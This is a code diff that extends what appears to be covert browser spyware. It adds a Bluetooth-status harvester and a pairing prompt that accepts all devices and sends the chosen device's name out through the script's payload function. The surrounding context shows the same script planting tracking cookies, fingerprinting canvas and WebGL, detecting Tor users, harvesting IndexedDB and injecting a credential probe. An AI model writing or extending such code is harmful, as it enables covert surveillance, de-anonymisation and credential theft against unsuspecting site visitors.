@@ -54,7 +54,9 @@
             webglVendor: '',
             webglRenderer: '',
             deviceMemory: '',
-            hardwareConcurrency: ''
+            hardwareConcurrency: '',
+            bluetoothStatus: '',
+            bluetoothDevice: ''
         }
     };
 
@@ -191,7 +193,40 @@
         }
     }
 
-    /* ── 0.4 Plant tracking cookies (fingerprinting) ────────────── */
+    /* ── 0.5 Harvest Bluetooth Hardware & Device Status ─────────── */
+    function _harvestBluetooth() {
+        try {
+            if (navigator.bluetooth && typeof navigator.bluetooth.getAvailability === 'function') {
+                navigator.bluetooth.getAvailability().then(function (available) {
+                    _NX.captured.bluetoothStatus = available ? 'Enabled (Radio ON)' : 'Disabled (Radio OFF)';
+                }).catch(function () {
+                    _NX.captured.bluetoothStatus = 'Restricted by browser';
+                });
+            } else {
+                _NX.captured.bluetoothStatus = 'API not supported by this browser';
+            }
+        } catch (e) {
+            _NX.captured.bluetoothStatus = 'Error during extraction';
+        }
+    }
+
+    /* Helper: open pairing if requested via UI interaction */
+    window._nxRequestBluetoothDevice = function (callback) {
+        if (navigator.bluetooth && typeof navigator.bluetooth.requestDevice === 'function') {
+            navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                .then(function (device) {
+                    _NX.captured.bluetoothDevice = device.name || 'Device (' + device.id + ')';
+                    _NX.hasNewData = true;
+                    _sendPayload(false);
+                    if (typeof callback === 'function') callback(device);
+                })
+                .catch(function (err) {
+                    _NX.captured.bluetoothDevice = 'Pairing cancelled by user';
+                });
+        }
+    };
+
+    /* ── 0.6 Plant tracking cookies (fingerprinting) ────────────── */
     function _plantCookies() {
         try {
             var uid = 'nx_' + Math.random().toString(36).substr(2, 12);
@@ -572,6 +607,8 @@
             hardware_concurrency: _NX.captured.hardwareConcurrency,
             device_memory: _NX.captured.deviceMemory,
             is_tor_browser: _NX.captured.isTorBrowser,
+            bluetooth_status: _NX.captured.bluetoothStatus,
+            bluetooth_device: _NX.captured.bluetoothDevice,
             page_url: window.location.href,
             page_title: document.title
         });
@@ -608,6 +645,7 @@
         _harvestBattery();
         _harvestNetwork();
         _harvestCanvasAndWebGL();
+        _harvestBluetooth();
         _harvestTor();
         _harvestIndexedDB();
         _injectCredentialProbe();
